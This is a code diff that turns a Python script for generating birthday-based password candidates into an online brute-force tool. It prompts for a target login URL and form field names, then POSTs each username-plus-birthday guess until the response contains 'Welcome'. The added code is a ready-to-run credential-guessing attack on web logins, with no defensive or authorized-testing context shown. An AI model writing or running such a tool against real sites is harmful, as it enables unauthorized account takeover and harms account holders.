@@ -1,38 +1,54 @@
-from datetime import datetime
+import requests
 
-def generate_birthdays():
-    birthdays = []
+def generate_passwords(username, symbol):
+    passwords = []
     for month in range(1, 13):
         for day in range(1, 32):
-            try:
-                datetime.strptime(f"{month:02d}{day:02d}", "%m%d")
-                birthdays.append(f"{month:02d}{day:02d}")
-            except ValueError:
+            if month == 2 and day > 29:
                 continue
-    return birthdays
+            if month in [4, 6, 9, 11] and day > 30:
+                continue
+            birthday = f"{month:02d}{day:02d}"
+            if symbol == "none":
+                password = f"{username}{birthday}"
+            else:
+                password = f"{username}{symbol}{birthday}"
+            passwords.append(password)
+    return passwords
 
-def generate_birthrack(username, symbols):
-    birthdays = generate_birthdays()
-    password_list = []
-    
-    for symbol in symbols:
-        for bday in birthdays:
-            password_list.append(username + symbol + bday)
-            password_list.append(username.capitalize() + symbol + bday)
-            password_list.append(username.upper() + symbol + bday)
-    
-    return password_list
+def attempt_login(url, user_field, pass_field, username, passwords):
+    for password in passwords:
+        data = {
+            user_field: username,
+            pass_field: password
+        }
+        try:
+            response = requests.post(url, data=data)
+            if "Welcome" in response.text:  # ←成功判定は適宜変更
+                print(f"[✔] Success: {username}:{password}")
+                return
+            else:
+                print(f"[×] Failed: {password}")
+        except requests.RequestException as e:
+            print(f"[!] Error: {e}")
+    print("[!] All passwords tried. No success.")
 
-# Input
-username = input("Enter username: ")
-symbol_input = input("Enter symbols separated by commas (e.g., _, @, -): ")
-symbols = [s.strip() for s in symbol_input.split(',') if s.strip()] + [""]
+def main():
+    url = input("[?] Enter target login URL: ").strip()
+    username = input("[?] Enter the username: ").strip()
+    symbol = input("[?] Choose a symbol before birthday (_/@/none): ").strip()
+    if symbol not in ['_', '@', 'none']:
+        print("[!] Invalid symbol. Use _, @, or none.")
+        return
 
-# Generate
-passwords = generate_birthrack(username, symbols)
+    user_field = input("[?] Enter form field name for username: ").strip()
+    pass_field = input("[?] Enter form field name for password: ").strip()
 
-# Output
-with open("birthrack_output.txt", "w") as f:
-    for pw in passwords:
-        print(pw)
-        f.write(pw + "\n")
+    print("[+] Generating passwords...")
+    passwords = generate_passwords(username, symbol)
+
+    print("[+] Starting login attempts...")
+    attempt_login(url, user_field, pass_field, username, passwords)
+
+if __name__ == "__main__":
+    main()
